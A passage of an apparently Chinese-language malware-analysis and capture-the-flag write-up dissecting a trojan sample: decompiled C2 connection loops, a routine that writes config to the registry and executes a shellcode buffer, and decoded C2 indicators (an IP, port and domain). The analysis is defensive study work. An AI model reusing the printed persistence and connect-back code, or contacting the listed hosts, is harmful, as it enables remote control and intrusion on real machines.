22); *(_DWORD *)optval_ = 30000; setsockopt(s_3, 0xFFFF, 4102, optval_, 4); // 设置 SO_KEEPALIVE (启用保持活动机制, 8) 为 1 s_5 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval__1 = 1; if ( !setsockopt(s_5, 0xFFFF, 8, optval__1, 4) ) { // 如果 SO_KEEPALIVE 设置成功，则配置 Keep-Alive 定时参数 s_4 = *((_QWORD *)ArgList + 22); vInBuffer[0] = 1; // 开关 (1: 启用) vInBuffer[1] = 180000; // 保持活动时间 (180 秒 或 3 分钟) vInBuffer[2] = 5000; // 保持活动间隔 (5 秒) // 使用 WSAIoctl 和 SIO_KEEPALIVE_VALS (0x98000004) 设置自定义 Keep-Alive 参数 WSAIoctl(s_4, 0x98000004, vInBuffer, 0xCu, 0, 0, &amp;cbBytesReturned, 0, 0); } // --- 7. 更新状态并创建工作线程 --- _InterlockedExchange((volatile __int32 *)ArgList + 8, 1); // 原子地设置连接状态标志为 1 (例如：已连接) ThrdAddr = 0; // 创建一个线程 (例如：接收/读取线程) *((_QWORD *)ArgList + 20) = beginthreadex(0, 0, sub_140003690, ArgList, 0, &amp;ThrdAddr); ThrdAddr_ = 0; // 创建第二个线程 (例如：发送/写入线程或心跳线程) *((_QWORD *)ArgList + 21) = beginthreadex(0, 0, sub_1400037E0, ArgList, 0, &amp;ThrdAddr_); return 1; // 成功} sub_140003390函数是 Windows 环境中建立出站 TCP 网络连接的常见模式 1通过 *(_WORD *)name.sa_data = htons(hostshort); 将其转换为网络字节序并设置为socket连接端口 123name.sa_family = 2; // AF_INET*(_WORD *)name.sa_data = htons(hostshort); // 端口号 (网络字节序)*(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // IP地址 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// Hidden C++ exception states: #wind=2void __fastcall __noreturn sub_7FF6175EA440(LPVOID lpThreadParameter){ int v1; // eax __int64 v2; // rdi void *v3; // rax __int64 v4; // rbp void *v5; // rax __int64 v6; // rsi int v7; // r11d int v8; // eax void (__fastcall **v9)(_QWORD); // rbx unsigned int v10; // eax int v11; // ebx _QWORD v12[2]; // [rsp+38h] [rbp-60h] BYREF int v13; // [rsp+48h] [rbp-50h] HANDLE hObject; // [rsp+50h] [rbp-48h] int v15; // [rsp+60h] [rbp-38h] HANDLE hHandle; // [rsp+68h] [rbp-30h] void *v17; // [rsp+A8h] [rbp+10h] BYREF CreateThread(0, 0, StartAddress, 0, 0, 0); CreateThread(0, 0, sub_7FF6175EA3E0, 0, 0, 0); v1 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB2C); Sleep(1000 * v1); v2 = 0; v3 = operator new(0xB8u); if ( v3 ) v4 = sub_7FF6175E3230(v3); else v4 = 0; v5 = operator new(0x368u); v17 = v5; if ( v5 ) v6 = sub_7FF6175E7690(v5); else v6 = 0; while ( 1 ) { sub_7FF6175E3210(); if ( byte_7FF61763E99E ) { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;8888&quot;); // &quot;6666&quot; v7 = dword_7FF61763F8E8; } else { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;6666&quot;); // &quot;6666&quot; v7 = dword_7FF61763F6A8; } byte_7FF61763E99E = byte_7FF61763E99E == 0; dword_7FF61763E550 = v7; if ( ++dword_7FF61763F3F4 == 200 ) { sub_7FF6175E3210(); wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;80&quot;); // &quot;6666&quot; v7 = dword_7FF61763FB28; dword_7FF61763E550 = dword_7FF61763FB28; dword_7FF61763F3F4 = 0; } if ( v2 ) { (**(void (__fastcall ***)(__int64))v2)(v2); v7 = dword_7FF61763E550; } v2 = v6; if ( v7 == 1 ) v2 = v4; v8 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB68); Sleep(1000 * v8); v9 = *(void (__fastcall ***)(_QWORD))v2; v10 = sub_7FF6175EC5F8(a6666); // &quot;6666&quot; if ( ((unsigned __int8 (__fastcall *)(__int64, wchar_t *, _QWORD))v9[4])(v2, a127001, v10) )// &quot;127.0.0.1&quot; { v11 = dword_7FF61763FCE8; v12[0] = &amp;CManager::`vftable'; v12[1] = v2; (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v2 + 24LL))(v2, v12); hObject = CreateEventA(0, 1, 0, 0); v13 = 0; v12[0] = &amp;CKernelManager::`vftable'; hHandle = 0; v15 = v11; LOWORD(v17) = 260; (*(void (__fastcall **)(__int64, void **, __int64))(*(_QWORD *)v2 + 16LL))(v2, &amp;v17, 2); (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 40LL))(v2); WaitForSingleObject(hHandle, 0xFFFFFFFF); v12[0] = &amp;CKernelManager::`vftable'; CloseHandle(hHandle); v12[0] = &amp;CManager::`vftable'; CloseHandle(hObject); } }} 1这是一个无限循环的线程函数 sub_7FF6175EA440 ，负责建立与C&amp;C服务器的连接并执行后续操作。函数使用 __noreturn 声明，表示它永远不会返回 这里发现了一些信息我们copy下来看一下 这些全是TCP 协议底层日志，说明程序不是简单调用系统 TCP 接口，而是实现了自定义的 TCP 通信（常见于木马 / 远控程序，用于稳定和控制端交互） 字符串 含义（通俗解释） 排查价值 recv sn=%lu 接收 TCP 数据包，记录「序列号（sn）」 证明程序在和外部（如黑客服务器）进行 TCP 数据交互，sn 是数据包有序传输的标识 input ack: sn=%lu rtt=%ld rto=%ld 收到 TCP 确认包（ACK），记录序列号、往返时间（rtt）、重传超时（rto） 木马为了保证 C2 连接稳定，会动态调整 rto（避免连接断开），是主动通信的铁证 input psh: sn=%lu ts=%lu 收到 TCP 推送包（PSH），记录序列号和时间戳（ts） PSH 包用于「强制立即传输数据」，常见于黑客发送控制指令、接收窃取数据时 input probe 收到 TCP 探测包 黑客可能在通过探测包检测你的主机是否在线、连接是否存活 input wins: %lu 记录 TCP 窗口大小（wins） 优化数据传输效率，进一步证明是「持续双向通信」（而非单次请求） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465data:000000014001DBB8 aRoLdBytes db '[RO] %ld bytes',0 ; DATA XREF: sub_140001740+2E↑o.rdata:000000014001DBB8 ; sub_140002880+14A↑o ....rdata:000000014001DBC7 align 8.rdata:000000014001DBC8 aRecvSnLu db 'recv sn=%lu',0 ; DATA XREF: sub_140001B70+FF↑o.rdata:000000014001DBD4 align 8.rdata:000000014001DBD8 aRiDBytes db '[RI] %d bytes',0 ; DATA XREF: sub_140002390+3A↑o.rdata:000000014001DBE6 align 8.rdata:000000014001DBE8 aInputAckSnLuRt db 'input ack: sn=%lu rtt=%ld rto=%ld',0.rdata:000000014001DBE8 ; DATA XREF: sub_140002390+271↑o.rdata:000000014001DC0A align 10h.rdata:000000014001DC10 aInputPshSnLuTs db 'input psh: sn=%lu ts=%lu',0.rdata:000000014001DC10 ; DATA XREF: sub_140002390+2AE↑o.rdata:000000014001DC29 align 10h.rdata:000000014001DC30 aInputProbe db 'input probe',0 ; DATA XREF: sub_140002390+375↑o.rdata:000000014001DC3C align 20h.rdata:000000014001DC40 aInputWinsLu db 'input wins: %lu',0 ; DATA XREF: sub_140002390+39E↑o.rdata:000000014001DC50 dq offset ??_R4CManager@@6B@ ; const CManager::`RTTI Complete Object Locator'.rdata:000000014001DC58 ; const CManager::`vftable'.rdata:000000014001DC58 ??_7CManager@@6B@ dq offset nullsub_2 ; DATA XREF: sub_140006E50+27↑o.rdata:000000014001DC58 ; sub_140006EB0+21↑o ....rdata:000000014001DC60 dq offset ??_R4CTcpSocket@@6B@ ; const CTcpSocket::`RTTI Complete Object Locator'.rdata:000000014001DC68 ; const CTcpSocket::`vftable'.rdata:000000014001DC68 ??_7CTcpSocket@@6B@ dq offset sub_140003310.rdata:000000014001DC68 ; DATA XREF: sub_140003230+21↑o.rdata:000000014001DC70 dq offset sub_140005A30.rdata:000000014001DC78 dq offset sub_140003860.rdata:000000014001DC80 dq offset ?swfun@std@@YAXAEAVios_base@1@_J@Z ; std::swfun(std::ios_base &amp;,__int64).rdata:000000014001DC88 dq offset sub_140003390.rdata:000000014001DC90 dq offset sub_140003C10.rdata:000000014001DC98 unk_14001DC98 db 0 ; DATA XREF: sub_140009460+61↑o.rdata:000000014001DC99 db 0.rdata:000000014001DC9A db 0.rdata:000000014001DC9B db 0.rdata:000000014001DC9C db 0.rdata:000000014001DC9D db 0.rdata:000000014001DC9E db 0.rdata:000000014001DC9F db 0.rdata:000000014001DCA0 aInvalidStringP db 'invalid string position',0.rdata:000000014001DCA0 ; DATA XREF: sub_1400066C0+1C↑o.rdata:000000014001DCA0 ; sub_1400067F0+27↑o ....rdata:000000014001DCB8 aStringTooLong db 'string too long',0 ; DATA XREF: sub_1400067F0+71↑o.rdata:000000014001DCB8 ; sub_140006920+8D↑o ....rdata:000000014001DCC8 align 10h.rdata:000000014001DCD0 ; const WCHAR aD33f351a4aeea5.rdata:000000014001DCD0 aD33f351a4aeea5: ; DATA XREF: sub_140006EF0+8D↑o.rdata:000000014001DCD0 ; sub_140006EF0+F2↑o ....rdata:000000014001DCD0 text &quot;UTF-16LE&quot;, 'd33f351a4aeea5e608853d1a56661059',0.rdata:000000014001DD12 align 8.rdata:000000014001DD18 aDenglupeizhi db 'denglupeizhi',0 ; DATA XREF: sub_140007500+23↑o.rdata:000000014001DD25 align 8.rdata:000000014001DD28 ; const WCHAR SubKey.rdata:000000014001DD28 SubKey: ; DATA XREF: sub_140006D20+40↑o.rdata:000000014001DD28 text &quot;UTF-16LE&quot;, 'SOFTWARE',0.rdata:000000014001DD3A align 20h.rdata:000000014001DD40 ; const WCHAR ValueName.rdata:000000014001DD40 ValueName: ; DATA XREF: sub_140006D20+67↑o.rdata:000000014001DD40 ; sub_140006D20+79↑o.rdata:000000014001DD40 text &quot;UTF-16LE&quot;, 'IpDates_info',0.rdata:000000014001DD5A align 20h.rdata:000000014001DD60 ; const WCHAR aConsole1.rdata:000000014001DD60 aConsole1: ; DATA XREF: sub_140006EF0+39↑o.rdata:000000014001DD60 ; sub_140006EF0+367↑o.rdata:000000014001DD60 text &quot;UTF-16LE&quot;, 'Console\\1',0.rdata:000000014001DD74 align 8.rdata:000000014001DD78 aWindowsSystem3 db 'Windows\\System32\\tracerpt.exe',0 denglupeizhi（中文拼音：「登录配置」） 含义：程序的核心配置项（大概率存储 C2 服务器 IP、端口、登录密码 / 密钥）； 排查操作：在系统中搜索这个字符串（如注册表、本地配置文件），可能找到明文 / 加密的 C2 配置。 1234567891011121314151617181920212223242526272829__int64 __fastcall sub_140007500(int a1){ unsigned int v1; // r10d __int64 v2; // r9 int n12_1; // r8d __int64 n12; // rdx v1 = 0; v2 = 0; if ( a1 &lt;= 0 ) return 0xFFFFFFFFLL; while ( 1 ) { n12_1 = 0; for ( n12 = 0; n12 &lt; 12; ++n12 ) { if ( *((_BYTE *)lpBuffer + v2 + n12) != aDenglupeizhi[n12] ) break; ++n12_1; } if ( n12_1 == 12 ) break; ++v2; ++v1; if ( v2 &gt;= a1 ) return 0xFFFFFFFFLL; } return v1;} 这个函数也挺关键的 然后xfer到下面这个函数 12345678910111213141516171819202122232425262728293031323334353637__int64 __fastcall sub_140006D20(_DWORD *a1){ unsigned int v2; // eax HANDLE hProcess; // rax _QWORD v5[2]; // [rsp+30h] [rbp-28h] BYREF DWORD dwProcessId[6]; // [rsp+40h] [rbp-18h] DWORD ExitCode; // [rsp+60h] [rbp+8h] BYREF HKEY hKey; // [rsp+68h] [rbp+10h] BYREF v2 = sub_140007500(dword_14005EBB8); if ( v2 != -1 ) memmove((char *)lpBuffer + v2, &amp;Src, 0x12A0u); RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE&quot;, 0, 0x102u, &amp;hKey); RegDeleteValueW(hKey, L&quot;IpDates_info&quot;); RegSetValueExW(hKey, L&quot;IpDates_info&quot;, 0, 3u, &amp;Src, 0x12A0u); RegCloseKey(hKey); if ( a1[10] ) { v5[0] = 0; v5[1] = 0; *(_QWORD *)dwProcessId = 0; while ( 1 ) { while ( !(unsigned int)sub_140007310((unsigned int)dword_14005EBB8, v5) ) ; while ( 1 ) { hProcess = OpenProcess(0x400u, 0, dwProcessId[0]); if ( !hProcess || !GetExitCodeProcess(hProcess, &amp;ExitCode) || ExitCode != 259 ) break; Sleep(0xBB8u); } } } ((void (*)(void))lpBuffer)(); return 0;} 上面的代码负责配置的更新与持久化，又负责核心恶意代码的执行，是整个攻击链条的关键 1启动 → 读取旧配置（IpDates_info）→ 调用sub_140007500查找配置位置 → 用Src更新配置 → 写入注册表持久化 → 监控目标进程状态 → 执行核心恶意代码（C2连接+攻击） 由下面这个就可以去查一下注册表了这里查注册表发现了ipdateinfo在HKEY_LOCAL_MACHINE\\SOFTWARE发现了信息这就很关键了 这里导出来看一眼，注册表文件内容转成txt了，怕你们乱点给自己电脑搞坏了，那估计只能重装了 注册表数据是 UTF-16LE 编码（Windows 注册表字符串默认编码），大量 00 是编码空字节，关键信息如下： 解码后的明文信息 对应十六进制片段（示例） 含义（木马配置作用） 115.190.102.32 31,00,31,00,35,00,2e,00,31,00,39,00,30,00,2e,00,31,00,30,00,32,00,2e,00,33,00,32,00 木马的 C2 服务器 IP，就是学长的远程服务器 6000 36,00,30,00,30,00,30,00 C2 服务器的 监听端口，对应 TCP 连接的 6000 端口，是木马和黑客通信的核心端口 127.0.0.1 31,00,32,00,37,00,2e,00,30,00,2e,00,30,00,2e,00,31,00 木马的 本地监听 IP（回环地址），估计是用于本地进程通信或反向代理（隐藏自身行为） 80 38,00,30,00 本地监听端口（80 端口，模拟 HTTP 服务，规避防火墙检测） 1.0 31,00,2e,00,30,00 木马版本号（简单标识版本，无特殊技术意义） 2025.11. 9 32,00,30,00,32,00,35,00,2e,00,31,00,31,00,2e,00,20,00,39,00 配置更新日期（生成配置的时间，用于版本管理） 1（多个零散出现） 01,00,00,00 或 31,00 功能开关（对应之前逆向的 dword_14005F6A8 等变量，1=启用，比如启用 C2 连接、本地监听） 这里可以看到日期 当然这分析出来的只是学长的服务器IP并不是真正的后门IP，这也可以作为木马分析1的题解，面对找不到进程或者任何关于木马的特征的情况可以这样操作，可以这样分析 去看一眼开机自启动注册表没发现什么奇怪的 shift+F12然后搜索到了.com的域名，这个很大可能就是开发c2工具的黑产团伙留下的后门域名，我们查一下域名 直接问ai懒得搜了 yk.ggdy.com md5值：af71b4482bc8e659e1c2a092a910d4ec 所以最终flag就是{yk.ggdy.com:2025年11月9日} 最后查一下这个IP在哪里，因为如果要溯源的话要网警权限，我这里就不继续深入了 https://ipconfig.com/zh","link":"/2025/12/10/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90%E4%B8%8E%E5%90%8E%E9%97%A8%E5%9F%9F%E5%90%8D%E6%BA%AF%E6%BA%90/"}],"tags":[],"categories":[],"pages":[]}